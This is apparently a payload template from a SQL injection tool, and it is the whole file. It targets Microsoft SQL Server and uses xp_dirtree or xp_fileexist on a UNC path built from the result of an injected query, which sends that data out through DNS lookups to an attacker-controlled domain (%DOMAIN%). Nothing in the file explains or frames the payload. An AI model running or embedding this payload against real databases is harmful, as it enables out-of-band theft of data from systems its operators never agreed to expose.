DECLARE @host varchar(1024);
SELECT @host='%PREFIX%.'+(%QUERY%)+'.%SUFFIX%.%DOMAIN%';
EXEC('master..xp_dirtree "\\'+@host+'\%RANDSTR1%"')
# or EXEC('master..xp_fileexist "\\'+@host+'\%RANDSTR1%"')
